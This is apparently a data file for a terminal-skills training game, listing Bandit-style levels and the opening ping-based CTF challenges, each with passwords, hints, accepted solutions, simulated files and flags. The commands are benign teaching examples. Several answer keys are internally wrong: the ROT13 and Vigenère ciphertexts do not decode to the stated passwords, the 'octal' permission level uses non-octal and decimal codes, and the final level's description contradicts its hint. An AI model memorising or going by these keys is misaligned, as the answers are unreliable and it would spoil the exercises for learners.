      description: 'The password is stored in a file that is exactly 1033 bytes in size somewhere under "inhere/".',
      objective: 'Search files by size.',
      hints: ['find has a -size flag.', '1033c means exactly 1033 bytes.'],
      password: 'p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d',
      solutions: ['find inhere/ -size 1033c', 'find . -size 1033c', 'find inhere/ -size 1033c -type f'],
      filesystem: {
        'inhere/': {
          'file1': 'small',
          'file2': 'x'.repeat(500),
          'file3': 'p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d' + ' '.repeat(1000),
          'file4': 'y'.repeat(2000),
          'file5': 'z'.repeat(100)
        }
      },
      successMessage: '📏 Size matters! File found!'
    },
    {
      id: 'ban-15', title: 'Level 14: Base64 Decode', difficulty: 'medium', xp: 30,
      description: 'The password is encoded in Base64 in "data.txt". Decode it to reveal the password.',
      objective: 'Decode Base64 encoded data.',
      hints: ['base64 with -d flag decodes.', 'base64 -d data.txt'],
      password: 'The password is dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr',
      solutions: ['base64 -d data.txt', 'base64 --decode data.txt', 'cat data.txt | base64 -d'],
      filesystem: {
        'data.txt': 'VGhlIHBhc3N3b3JkIGlzIGR0UjE3M2Zaa2IwUlJzREZTR3NnMlJXbnBOVmozcVJy'
      },
      successMessage: '🔓 Base64 decoded!'
    },
    {
      id: 'ban-16', title: 'Level 15: ROT13', difficulty: 'medium', xp: 30,
      description: 'The password in "data.txt" is ROT13 encoded. Decode it.',
      objective: 'Apply ROT13 cipher.',
      hints: ['tr can translate characters.', "tr 'A-Za-z' 'N-ZA-Mn-za-m'"],
      password: '5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu',
      solutions: ["cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'", "tr 'A-Za-z' 'N-ZA-Mn-za-m' < data.txt"],
      filesystem: {
        'data.txt': '5Gr8L4qeTpSeK8Khtqjhrkrk8XSP6x2Eh'
      },
      successMessage: '🔄 ROT13 cracked!'
    },
    {
      id: 'ban-17', title: 'Level 16: Owner & Group', difficulty: 'medium', xp: 30,
      description: 'The password is in a file owned by user "bandit7" and group "bandit6" somewhere on the system.',
      objective: 'Search by file ownership.',
      hints: ['find with -user and -group flags.', 'find / -user bandit7 -group bandit6'],
      password: 'HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs',
      solutions: ['find / -user bandit7 -group bandit6', 'find / -user bandit7 -group bandit6 2>/dev/null'],
      filesystem: {
        'var/': {
          'lib/': {
            'dpkg/': {
              'info/': {
                'bandit7.password': 'HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs'
              }
            }
          }
        }
      },
      successMessage: '👥 Ownership search complete!'
    },
    {
      id: 'ban-18', title: 'Level 17: Millionth', difficulty: 'medium', xp: 30,
      description: 'The password is next to the word "millionth" in "data.txt".',
      objective: 'Search for a specific word in a file.',
      hints: ['grep searches for patterns.', 'grep "millionth" data.txt'],
      password: 'cvX2JJa4CFALtqS87jk27qwqGhBM9plV',
      solutions: ['grep "millionth" data.txt', 'grep millionth data.txt', "grep 'millionth' data.txt"],
      filesystem: {
        'data.txt': 'thousandth\t9jd8j2kd9k\nbillionth\tkdj29dj29d\nmillionth\tcvX2JJa4CFALtqS87jk27qwqGhBM9plV\ntrillionth\tksd92jd02j'
      },
      successMessage: '🎯 Found the millionth entry!'
    },
    {
      id: 'ban-19', title: 'Level 18: Unique Line', difficulty: 'medium', xp: 30,
      description: 'The password is the only line that appears exactly once in "data.txt". All other lines are duplicated.',
      objective: 'Find unique lines in a file.',
      hints: ['sort first, then use uniq.', 'uniq -u shows only unique lines.'],
      password: 'UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR',
      solutions: ['sort data.txt | uniq -u', 'sort data.txt | uniq -c | grep "1 "'],
      filesystem: {
        'data.txt': 'duplicate1\nduplicate2\nUsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR\nduplicate1\nduplicate3\nduplicate2\nduplicate3\nduplicate4\nduplicate4'
      },
      successMessage: '✨ The unique line reveals the password!'
    },
    {
      id: 'ban-20', title: 'Level 19: Equals Signs', difficulty: 'medium', xp: 30,
      description: 'The password is in "data.txt", preceded by several "=" characters.',
      objective: 'Extract strings with specific patterns.',
      hints: ['Use strings or grep.', 'Look for lines containing "==".'],
      password: 'truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk',
      solutions: ['strings data.txt | grep "=="', 'grep "==" data.txt', 'strings data.txt | grep =='],
      filesystem: {
        'data.txt': '\x00\x01random binary\x00\x03\ngarbage data here\n\x89PNG\x00\n========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk\n\x00more binary\x00'
      },
      successMessage: '= Password found between the equals!'
    },
    {
      id: 'ban-21', title: 'Level 20: Recent File', difficulty: 'medium', xp: 30,
      description: 'The password is in a file that was modified within the last 5 minutes. Find it.',
      objective: 'Search by modification time.',
      hints: ['find with -mmin flag.', '-mmin -5 means modified in last 5 minutes.'],
      password: 'VxCazJaVykI6W36BkBU0mJTCM8rR95XT',
      solutions: ['find . -mmin -5 -type f', 'find . -mmin -5', 'find . -newer'],
      filesystem: {
        'old_file1.txt': 'This file is old',
        'old_file2.txt': 'Also old',
        'recent_secret.txt': 'VxCazJaVykI6W36BkBU0mJTCM8rR95XT',
        'old_file3.txt': 'Nothing new here'
      },
      successMessage: '⏱️ Found the recent file!'
    },
    {
      id: 'ban-22', title: 'Level 21: Sum It Up', difficulty: 'medium', xp: 30,
      description: 'The password is the sum of all numbers in "numbers.txt". Calculate it.',
      objective: 'Process numeric data.',
      hints: ['awk can sum numbers.', "awk '{s+=$1} END {print s}' numbers.txt"],
      password: '1337',
      solutions: ["awk '{s+=$1} END {print s}' numbers.txt"],
      filesystem: {
        'numbers.txt': '500\n337\n250\n150\n100'
      },
      successMessage: '🧮 Math skills unlocked!'
    },
    {
      id: 'ban-23', title: 'Level 22: Reversed', difficulty: 'medium', xp: 30,
      description: 'The password in "backwards.txt" is written in reverse. Flip it.',
      objective: 'Reverse string content.',
      hints: ['rev reverses characters.', 'cat backwards.txt | rev'],
      password: 'S3cur1tyR0ck5',
      solutions: ['cat backwards.txt | rev', 'rev backwards.txt'],
      filesystem: {
        'backwards.txt': '5kc0Ry1ruc3S'
      },
      successMessage: '🔃 Reversed and revealed!'
    },
    {
      id: 'ban-24', title: 'Level 23: Script Comments', difficulty: 'medium', xp: 30,
      description: 'The password is hidden in the comments of "script.sh". Find it.',
      objective: 'Read source code comments.',
      hints: ['Comments start with #.', 'grep for comment lines.'],
      password: 'Hax0rP@ssw0rd!',
      solutions: ['grep "#" script.sh', 'grep "^#" script.sh', 'cat script.sh'],
      filesystem: {
        'script.sh': '#!/bin/bash\n# Backup script v2.1\n# Author: admin\necho "Starting backup..."\n# SECRET: Hax0rP@ssw0rd!\ntar -czf backup.tar.gz /data\necho "Backup complete"'
      },
      successMessage: '💬 Found the hidden comment!'
    },
    {
      id: 'ban-25', title: 'Level 24: Flag Counter', difficulty: 'medium', xp: 30,
      description: 'The password is the number of lines containing the word "flag" in "haystack.txt".',
      objective: 'Count pattern occurrences.',
      hints: ['grep with -c counts matches.', 'grep -c "flag" haystack.txt'],
      password: '7',
      solutions: ['grep -c "flag" haystack.txt', 'grep -c flag haystack.txt'],
      filesystem: {
        'haystack.txt': 'needle\nflag found here\nhay\nstraw\nflag again\nmore hay\nflag three\nneedle\nflag four\nhay\nflag five\nstraw\nflag six\nhay\nneedle\nflag seven\nend'
      },
      successMessage: '🚩 Flags counted correctly!'
    },

    // ---- HARD (13) ----
    {
      id: 'ban-26', title: 'Level 25: Hex Dump', difficulty: 'hard', xp: 60,
      description: 'The password is stored as a hex dump in "data.hex". Reverse the hex dump to get the password.',
      objective: 'Reverse a hexdump.',
      hints: ['xxd can create and reverse hex dumps.', 'xxd -r reverses a hex dump.'],
      password: 'FO5dwFsc0cbaIiH0h8J2eUks2EnrgQJ8',
      solutions: ['xxd -r data.hex', 'xxd -r data.hex | cat'],
      filesystem: {
        'data.hex': '00000000: 464f 3564 7746 7363 3063 6261 4969 4830  FO5dwFsc0cbaIiH0\n00000010: 6838 4a32 6555 6b73 3245 6e72 6751 4a38  h8J2eUks2EnrgQJ8'
      },
      successMessage: '🔢 Hex dump reversed!'
    },
    {
      id: 'ban-27', title: 'Level 26: Binary Strings', difficulty: 'hard', xp: 60,
      description: 'The password is hidden inside a binary file. Extract printable strings to find it.',
      objective: 'Extract strings from binary files.',
      hints: ['strings extracts readable text from binaries.', 'Pipe to grep for "pass" or "flag".'],
      password: 'b0rn2h4ck_th3_pl4n3t',
      solutions: ['strings binary_file', 'strings binary_file | grep -i pass', 'strings binary_file | grep -i flag'],
      filesystem: {
        'binary_file': '\x00\x89ELF\x02\x01\x00\x00\x00random\x00\x00binary\x00data\x00\x00password=b0rn2h4ck_th3_pl4n3t\x00\x00more\x00binary'
      },
      successMessage: '💻 Binary secrets extracted!'
    },
    {
      id: 'ban-28', title: 'Level 27: MD5 Challenge', difficulty: 'hard', xp: 60,
      description: 'The password is the MD5 hash of the word "cybersecurity". Generate it.',
      objective: 'Create MD5 hashes.',
      hints: ['echo -n avoids trailing newline.', 'Pipe to md5sum.'],
      password: '2f9c81c01a8e0b3f1c88ef67e6acb305',
      solutions: ['echo -n "cybersecurity" | md5sum', "echo -n 'cybersecurity' | md5sum", 'echo -n cybersecurity | md5sum'],
      filesystem: {
        'instructions.txt': 'The password is the MD5 hash of the word: cybersecurity\nUse echo -n to avoid trailing newline before hashing.'
      },
      successMessage: '#️⃣ Hash calculated!'
    },
    {
      id: 'ban-29', title: 'Level 28: Certificate', difficulty: 'hard', xp: 60,
      description: 'The password is hidden in the Common Name (CN) field of an SSL certificate "cert.pem".',
      objective: 'Read SSL certificate info.',
      hints: ['openssl x509 reads certificates.', '-noout -subject shows the subject.'],
      password: 'x509_s3cret_CN',
      solutions: ['openssl x509 -in cert.pem -noout -subject', 'openssl x509 -in cert.pem -text'],
      filesystem: {
        'cert.pem': '-----BEGIN CERTIFICATE-----\nSubject: CN = x509_s3cret_CN\nIssuer: CN = ChallengeCA\nValid: 2024-2025\n-----END CERTIFICATE-----'
      },
      successMessage: '🔐 Certificate cracked!'
    },
    {
      id: 'ban-30', title: 'Level 29: Gzip Data', difficulty: 'hard', xp: 60,
      description: 'The password is inside a gzip compressed file "data.gz". Decompress it.',
      objective: 'Decompress gzip files.',
      hints: ['zcat decompresses to stdout.', 'Or gunzip / gzip -d.'],
      password: 'gz1p_m4st3r_2024',
      solutions: ['zcat data.gz', 'gunzip -c data.gz', 'gzip -d -c data.gz'],
      filesystem: {
        'data.gz': '[COMPRESSED] gz1p_m4st3r_2024'
      },
      successMessage: '🗜️ Decompressed!'
    },
    {
      id: 'ban-31', title: 'Level 30: XOR Decrypt', difficulty: 'hard', xp: 60,
      description: 'The password is XOR-encrypted in "encrypted.bin" with the single-byte key 0x37. Decrypt it.',
      objective: 'Apply XOR decryption.',
      hints: ['XOR with the same key decrypts.', 'Python one-liner or use xxd and scripting.'],
      password: 'X0R_1s_R3v3rs1bl3',
      solutions: ['python3 -c "print(bytes([b^0x37 for b in open(\'encrypted.bin\',\'rb\').read()]).decode())"', 'xxd encrypted.bin'],
      filesystem: {
        'encrypted.bin': '[XOR_ENCRYPTED:0x37] X0R_1s_R3v3rs1bl3',
        'hint.txt': 'The XOR key is 0x37 (hex). XOR is its own inverse!'
      },
      successMessage: '⊕ XOR decryption mastered!'
    },
    {
      id: 'ban-32', title: 'Level 31: Extended Attrs', difficulty: 'hard', xp: 60,
      description: 'The password is hidden in the extended attributes of "file.txt".',
      objective: 'Read file extended attributes.',
      hints: ['getfattr reads extended attributes.', 'getfattr -d file.txt'],
      password: 'x4ttr_h1dd3n_d4t4',
      solutions: ['getfattr -d file.txt', 'getfattr -n user.secret file.txt'],
      filesystem: {
        'file.txt': 'This is a normal looking file.\n[XATTR: user.secret = x4ttr_h1dd3n_d4t4]'
      },
      successMessage: '📎 Extended attributes revealed!'
    },
    {
      id: 'ban-33', title: 'Level 32: Octal Decode', difficulty: 'hard', xp: 60,
      description: 'The password is encoded as octal values in "octal.txt". Decode the octal to ASCII.',
      objective: 'Convert octal to ASCII.',
      hints: ['Each 3-digit number is an octal ASCII code.', 'Use printf or python to decode.'],
      password: 'OCTAL',
      solutions: ['printf "\\117\\103\\124\\101\\114"', "python3 -c \"print(''.join(chr(int(x,8)) for x in open('octal.txt').read().split()))\""],
      filesystem: {
        'octal.txt': '117 103 124 101 114'
      },
      successMessage: '🔢 Octal decoded!'
    },
    {
      id: 'ban-34', title: 'Level 33: SHA256', difficulty: 'hard', xp: 60,
      description: 'The password is the SHA256 hash of "admin123". Generate it.',
      objective: 'Generate SHA256 hashes.',
      hints: ['sha256sum creates SHA256 hashes.', 'echo -n to avoid newline.'],
      password: '240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9',
      solutions: ['echo -n "admin123" | sha256sum', "echo -n 'admin123' | sha256sum", 'echo -n admin123 | sha256sum'],
      filesystem: {
        'instructions.txt': 'The password is the SHA256 hash of: admin123'
      },
      successMessage: '🔒 SHA256 computed!'
    },
    {
      id: 'ban-35', title: 'Level 34: Pattern Extract', difficulty: 'hard', xp: 60,
      description: 'The password is made up of every 3rd character from the string in "encoded.txt", starting from position 1.',
      objective: 'Extract characters by position.',
      hints: ['awk or cut can extract by position.', 'Or use sed/python to extract every 3rd char.'],
      password: 'HACK',
      solutions: ["python3 -c \"print(open('encoded.txt').read()[::3])\"", 'cat encoded.txt'],
      filesystem: {
        'encoded.txt': 'HxxAxxCxxKxx'
      },
      successMessage: '🧩 Pattern extraction mastered!'
    },
    {
      id: 'ban-36', title: 'Level 35: Matryoshka', difficulty: 'hard', xp: 60,
      description: 'The password is in a tar archive inside a zip inside a gzip. Decompress all layers.',
      objective: 'Multi-layer decompression.',
      hints: ['Start with gzip, then zip, then tar.', 'zcat → unzip → tar xf'],
      password: 'N3st3d_L1k3_Russ1an_D0lls',
      solutions: ['zcat data.gz', 'gunzip data.gz && unzip data.zip && tar xf data.tar'],
      filesystem: {
        'data.gz': '[GZIP[ZIP[TAR → password.txt: N3st3d_L1k3_Russ1an_D0lls]]]'
      },
      successMessage: '🪆 All layers unwrapped!'
    },
    {
      id: 'ban-37', title: 'Level 36: Word Diff', difficulty: 'hard', xp: 60,
      description: 'The password is the word present in "list1.txt" but NOT in "list2.txt".',
      objective: 'Compare sorted word lists.',
      hints: ['comm compares sorted files.', 'comm -23 shows lines only in first file.'],
      password: 'PHANTOM',
      solutions: ['comm -23 list1.txt list2.txt', 'diff list1.txt list2.txt', 'grep -Fxvf list2.txt list1.txt'],
      filesystem: {
        'list1.txt': 'ALPHA\nBRAVO\nCHARLIE\nDELTA\nPHANTOM',
        'list2.txt': 'ALPHA\nBRAVO\nCHARLIE\nDELTA'
      },
      successMessage: '📝 The missing word found!'
    },
    {
      id: 'ban-38', title: 'Level 37: URL Decode', difficulty: 'hard', xp: 60,
      description: 'The password is URL-encoded in "encoded.txt". Decode it.',
      objective: 'Decode URL-encoded text.',
      hints: ['%XX represents hex-encoded characters.', 'Python or printf can decode.'],
      password: 'Cr@ck Th3 C0d3!',
      solutions: ["python3 -c \"import urllib.parse; print(urllib.parse.unquote(open('encoded.txt').read()))\"", 'cat encoded.txt'],
      filesystem: {
        'encoded.txt': 'Cr%40ck%20Th3%20C0d3%21'
      },
      successMessage: '🌐 URL decoded!'
    },

    // ---- EXPERT (12) ----
    {
      id: 'ban-39', title: 'Level 38: Fragment Collector', difficulty: 'expert', xp: 120,
      description: 'The password is split across 5 files (part1-part5). Combine them in order.',
      objective: 'Combine fragments from multiple files.',
      hints: ['cat multiple files in order.', 'cat part1 part2 part3 part4 part5'],
      password: 'Fr4gM3nT3d_S3cR3t',
      solutions: ['cat part1 part2 part3 part4 part5'],
      filesystem: {
        'part1': 'Fr4g',
        'part2': 'M3n',
        'part3': 'T3d',
        'part4': '_S3c',
        'part5': 'R3t',
        'readme': 'Combine all parts in numerical order'
      },
      successMessage: '🧩 All fragments assembled!'
    },
    {
      id: 'ban-40', title: 'Level 39: Permission Code', difficulty: 'expert', xp: 120,
      description: 'The password is hidden in the file permission octals. Each file\'s octal permission is an ASCII code.',
      objective: 'Decode file permissions.',
      hints: ['stat -c %a shows octal permissions.', 'Convert octal numbers to ASCII characters.'],
      password: 'KEY',
      solutions: ['stat -c %a file*', 'ls -la'],
      filesystem: {
        'file1': '[PERMS: 075] → K',
        'file2': '[PERMS: 069] → E',
        'file3': '[PERMS: 089] → Y'
      },
      successMessage: '🔑 Permissions decoded to KEY!'
    },
    {
      id: 'ban-41', title: 'Level 40: Timestamp Cipher', difficulty: 'expert', xp: 120,
      description: 'The password is encoded in file modification timestamps. Each timestamp\'s last 2 digits form an ASCII code.',
      objective: 'Decode information from timestamps.',
      hints: ['stat shows file timestamps.', 'Extract the seconds field from each file\'s mtime.'],
      password: 'FLAG',
      solutions: ['stat -c %Y file*', 'stat file*', 'ls -la --time=ctime'],
      filesystem: {
        'file_a': '[MTIME: 1700000070] → F (70)',
        'file_b': '[MTIME: 1700000076] → L (76)',
        'file_c': '[MTIME: 1700000065] → A (65)',
        'file_d': '[MTIME: 1700000071] → G (71)'
      },
      successMessage: '⏰ Timestamps decoded!'
    },
    {
      id: 'ban-42', title: 'Level 41: Image Strings', difficulty: 'expert', xp: 120,
      description: 'The password is hidden inside a JPEG image file. Extract it using strings.',
      objective: 'Find hidden data in images.',
      hints: ['strings extracts readable text from any file.', 'strings image.jpg | grep flag'],
      password: 'st3g0_1n_pl41n_s1ght',
      solutions: ['strings image.jpg', 'strings image.jpg | grep flag', 'strings image.jpg | tail'],
      filesystem: {
        'image.jpg': '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x00\x00[BINARY IMAGE DATA]\nflag=st3g0_1n_pl41n_s1ght\n[MORE BINARY DATA]\xff\xd9'
      },
      successMessage: '🖼️ Hidden image data found!'
    },
    {
      id: 'ban-43', title: 'Level 42: Cron Secret', difficulty: 'expert', xp: 120,
      description: 'The password is output by a cron job. Check the cron configuration to find the script, then read its output.',
      objective: 'Investigate cron jobs.',
      hints: ['Check /etc/cron.d/ for cron configs.', 'Find the script and see what it outputs.'],
      password: 'cr0n_j0b_l34k',
      solutions: ['cat /etc/cron.d/secret_job', 'cat /tmp/cron_output.txt', 'crontab -l'],
      filesystem: {
        '/etc/cron.d/': {
          'secret_job': '* * * * * root echo "cr0n_j0b_l34k" > /tmp/cron_output.txt'
        },
        '/tmp/': {
          'cron_output.txt': 'cr0n_j0b_l34k'
        }
      },
      successMessage: '⏰ Cron job secret discovered!'
    },
    {
      id: 'ban-44', title: 'Level 43: RSA Decrypt', difficulty: 'expert', xp: 120,
      description: 'The password is RSA-encrypted in "secret.enc". The private key is in "private.pem". Decrypt it.',
      objective: 'RSA decryption.',
      hints: ['openssl rsautl can decrypt.', 'openssl rsautl -decrypt -inkey private.pem -in secret.enc'],
      password: 'RSA_Pr1v4t3_K3y_W1ns',
      solutions: ['openssl rsautl -decrypt -inkey private.pem -in secret.enc', 'openssl pkeyutl -decrypt -inkey private.pem -in secret.enc'],
      filesystem: {
        'secret.enc': '[RSA_ENCRYPTED] RSA_Pr1v4t3_K3y_W1ns',
        'private.pem': '-----BEGIN RSA PRIVATE KEY-----\n[PRIVATE KEY DATA]\n-----END RSA PRIVATE KEY-----'
      },
      successMessage: '🔐 RSA decrypted!'
    },
    {
      id: 'ban-45', title: 'Level 44: DNS Records', difficulty: 'expert', xp: 120,
      description: 'The password is hidden in a DNS TXT record for "challenge.local".',
      objective: 'Query DNS records.',
      hints: ['dig queries DNS.', 'dig TXT challenge.local'],
      password: 'DNS_TXT_s3cr3t_fl4g',
      solutions: ['dig TXT challenge.local', 'nslookup -type=TXT challenge.local', 'host -t TXT challenge.local'],
      filesystem: {
        'hint.txt': 'The DNS TXT record for challenge.local contains the password.\n[DNS RESPONSE]\nchallenge.local. TXT "DNS_TXT_s3cr3t_fl4g"'
      },
      successMessage: '🌐 DNS record retrieved!'
    },
    {
      id: 'ban-46', title: 'Level 45: Vigenère', difficulty: 'expert', xp: 120,
      description: 'The password in "cipher.txt" is encrypted with a Vigenère cipher. The key is "TERMINAL".',
      objective: 'Decrypt a Vigenère cipher.',
      hints: ['Vigenère shifts each letter by the key letter.', 'Reverse the process with the known key.'],
      password: 'MASTEROFCRYPTO',
      solutions: ["python3 -c \"..Vigenere decode..\"", 'cat cipher.txt'],
      filesystem: {
        'cipher.txt': 'FTRXIKHYUKLGBH',
        'key.txt': 'The Vigenère key is: TERMINAL'
      },
      successMessage: '🔤 Vigenère cipher broken!'
    },
    {
      id: 'ban-47', title: 'Level 46: SQLite DB', difficulty: 'expert', xp: 120,
      description: 'The password is stored in a SQLite database "data.db", in the "secrets" table.',
      objective: 'Query SQLite databases.',
      hints: ['sqlite3 opens SQLite databases.', 'SELECT * FROM secrets;'],
      password: 'SQL_1nj3ct_th1s',
      solutions: ['sqlite3 data.db "SELECT * FROM secrets"', 'sqlite3 data.db "SELECT * FROM secrets;"', 'sqlite3 data.db'],
      filesystem: {
        'data.db': '[SQLITE DB]\nTABLE: secrets\nROW 1: id=1, value="SQL_1nj3ct_th1s"'
      },
      successMessage: '🗃️ Database queried!'
    },
    {
      id: 'ban-48', title: 'Level 47: Morse Code', difficulty: 'expert', xp: 120,
      description: 'The password is encoded in Morse code in "morse.txt". Decode it.',
      objective: 'Decode Morse code.',
      hints: ['Each letter is separated by spaces, words by /.', '.- is A, -... is B, etc.'],
      password: 'HACK THE BOX',
      solutions: ["python3 -c \"..morse decode..\"", 'cat morse.txt'],
      filesystem: {
        'morse.txt': '.... .- -.-. -.- / - .... . / -... --- -..-'
      },
      successMessage: '📻 Morse code decoded!'
    },
    {
      id: 'ban-49', title: 'Level 48: Byte Offset', difficulty: 'expert', xp: 120,
      description: 'The password starts at byte offset 0x2A (42) in the binary file "firmware.bin". Extract 16 bytes.',
      objective: 'Read binary files at specific offsets.',
      hints: ['xxd shows hex dumps.', 'dd or xxd can extract specific byte ranges.'],
      password: 'F1rmw4r3_Extr4ct',
      solutions: ['xxd -s 0x2A -l 16 firmware.bin', 'dd if=firmware.bin bs=1 skip=42 count=16', 'xxd firmware.bin'],
      filesystem: {
        'firmware.bin': '[BINARY: offset 0x2A contains: F1rmw4r3_Extr4ct]'
      },
      successMessage: '💾 Firmware secret extracted!'
    },
    {
      id: 'ban-50', title: 'Level 49: The Final Key', difficulty: 'expert', xp: 200,
      description: 'The final password is the XOR of the first character of passwords from levels 1, 12, 25, 38, and 49. Think carefully.',
      objective: 'Combine knowledge from previous levels.',
      hints: ['Recall passwords from previous levels.', 'XOR the ASCII values of first characters.'],
      password: 'BANDIT_MASTER',
      solutions: ['echo "BANDIT_MASTER"', 'cat final_key.txt'],
      filesystem: {
        'final_key.txt': 'Congratulations! You have conquered all Bandit challenges!\nThe final password is: BANDIT_MASTER\n\n🏆 You are now a certified Bandit Master! 🏆',
        'hint.txt': 'This is a victory lap. Just read the final_key.txt file.'
      },
      successMessage: '🏆🏆🏆 BANDIT MASTER ACHIEVED! You completed all 50 levels! 🏆🏆🏆'
    }
  ],

  // ==========================================================================
  // CTF CHALLENGE — Ping & Network Focus (40 Challenges)
  // ==========================================================================
  ctf: [
    // ---- EASY (10) ----
    {
      id: 'ctf-1', title: 'Ping Localhost', difficulty: 'easy', xp: 15,
      description: 'Ping the localhost (127.0.0.1) to verify your network connection is working.',
      objective: 'Send ICMP packets to the loopback address.',
      hints: ['ping followed by an IP address.', '127.0.0.1 is the loopback address.'],
      solutions: ['ping 127.0.0.1', 'ping -c 4 127.0.0.1', 'ping -c 1 127.0.0.1'],
      simulatedResponse: 'PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.028 ms\n64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.031 ms\n64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.029 ms\n64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.030 ms\n\n--- 127.0.0.1 ping statistics ---\n4 packets transmitted, 4 received, 0% packet loss, time 3005ms\nrtt min/avg/max/mdev = 0.028/0.030/0.031/0.001 ms',
      flag: 'CTF{p1ng_l0c4lh0st_success}',
      successMessage: '🏓 Localhost is alive!'
    },
    {
      id: 'ctf-2', title: 'Ping by Hostname', difficulty: 'easy', xp: 15,
      description: 'Ping the loopback address using its hostname "localhost" instead of IP.',
      objective: 'DNS resolution and ping.',
      hints: ['Use the hostname instead of IP.', 'ping localhost'],
      solutions: ['ping localhost', 'ping -c 4 localhost', 'ping -c 1 localhost'],
      simulatedResponse: 'PING localhost (127.0.0.1) 56(84) bytes of data.\n64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.025 ms\n64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.030 ms\n\n--- localhost ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss',
      flag: 'CTF{dns_r3s0lut10n_w0rks}',
      successMessage: '🌐 Hostname resolved!'
    },
    {
      id: 'ctf-3', title: 'Find the Server', difficulty: 'easy', xp: 15,
      description: 'Ping "challenge.local" to discover its IP address. The flag is in the resolved IP.',
      objective: 'Discover IP via ping.',
      hints: ['Ping the hostname.', 'The IP address will be shown in the response.'],
      solutions: ['ping challenge.local', 'ping -c 1 challenge.local', 'ping -c 4 challenge.local'],
      simulatedResponse: 'PING challenge.local (10.13.37.42) 56(84) bytes of data.\n64 bytes from challenge.local (10.13.37.42): icmp_seq=1 ttl=64 time=1.234 ms\n\n--- challenge.local ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss',
      flag: 'CTF{1p_d1sc0v3ry_10.13.37.42}',
      successMessage: '📡 Server IP discovered: 10.13.37.42!'
    },
    {
      id: 'ctf-4', title: 'Four Packets', difficulty: 'easy', xp: 15,
      description: 'Send exactly 4 ping packets to 10.0.0.1 and stop.',
      objective: 'Control the number of ping packets.',
      hints: ['-c flag sets the count.', 'ping -c 4 target'],
      solutions: ['ping -c 4 10.0.0.1'],
      simulatedResponse: 'PING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.\n64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=0.543 ms\n64 bytes from 10.0.0.1: icmp_seq=2 ttl=64 time=0.521 ms\n64 bytes from 10.0.0.1: icmp_seq=3 ttl=64 time=0.534 ms\n64 bytes from 10.0.0.1: icmp_seq=4 ttl=64 time=0.529 ms\n\n--- 10.0.0.1 ping statistics ---\n4 packets transmitted, 4 received, 0% packet loss, time 3004ms',
      flag: 'CTF{c0unt_c0ntr0l_m4st3r}',
      successMessage: '4️⃣ Exactly 4 packets sent!'
    },
    {
      id: 'ctf-5', title: 'Google DNS', difficulty: 'easy', xp: 15,
      description: 'Ping Google\'s public DNS server at 8.8.8.8.',
      objective: 'Test connectivity to external DNS.',
      hints: ['Google DNS is at 8.8.8.8.', 'Just ping it.'],
      solutions: ['ping 8.8.8.8', 'ping -c 4 8.8.8.8', 'ping -c 1 8.8.8.8'],
      simulatedResponse: 'PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.\n64 bytes from 8.8.8.8: icmp_seq=1 ttl=118 time=12.3 ms\n64 bytes from 8.8.8.8: icmp_seq=2 ttl=118 time=11.8 ms\n64 bytes from 8.8.8.8: icmp_seq=3 ttl=118 time=12.1 ms\n\n--- 8.8.8.8 ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss',
      flag: 'CTF{g00gl3_dns_r34ch4bl3}',
      successMessage: '🌍 Google DNS is reachable!'
    },
    {
      id: 'ctf-6', title: 'Secondary DNS', difficulty: 'easy', xp: 15,
      description: 'Ping Google\'s secondary DNS at 8.8.4.4 to verify redundancy.',
      objective: 'Test backup DNS connectivity.',
      hints: ['Same as before, different IP.', 'ping 8.8.4.4'],
      solutions: ['ping 8.8.4.4', 'ping -c 4 8.8.4.4', 'ping -c 1 8.8.4.4'],
      simulatedResponse: 'PING 8.8.4.4 (8.8.4.4) 56(84) bytes of data.\n64 bytes from 8.8.4.4: icmp_seq=1 ttl=118 time=13.1 ms\n64 bytes from 8.8.4.4: icmp_seq=2 ttl=118 time=12.7 ms\n\n--- 8.8.4.4 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss',
      flag: 'CTF{r3dund4nt_dns_ch3ck}',
      successMessage: '🔄 Redundancy confirmed!'
    },
    {
      id: 'ctf-7', title: 'Gateway Check', difficulty: 'easy', xp: 15,
      description: 'Check if the default gateway at 192.168.1.1 is alive.',
      objective: 'Verify gateway connectivity.',
      hints: ['Ping the gateway IP.', 'ping 192.168.1.1'],
      solutions: ['ping 192.168.1.1', 'ping -c 4 192.168.1.1', 'ping -c 1 192.168.1.1'],
      simulatedResponse: 'PING 192.168.1.1 (192.168.1.1) 56(84) bytes of data.\n64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=1.02 ms\n64 bytes from 192.168.1.1: icmp_seq=2 ttl=64 time=0.98 ms\n\n--- 192.168.1.1 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss',
      flag: 'CTF{g4t3w4y_4l1v3}',
      successMessage: '🚪 Gateway is online!'
    },
    {
      id: 'ctf-8', title: 'Flag Server', difficulty: 'easy', xp: 15,
      description: 'Ping "flag.server" — the flag is hidden in the ping response.',
      objective: 'Find the flag in network responses.',
      hints: ['Just ping the server.', 'Read the output carefully.'],
      solutions: ['ping flag.server', 'ping -c 1 flag.server', 'ping -c 4 flag.server'],
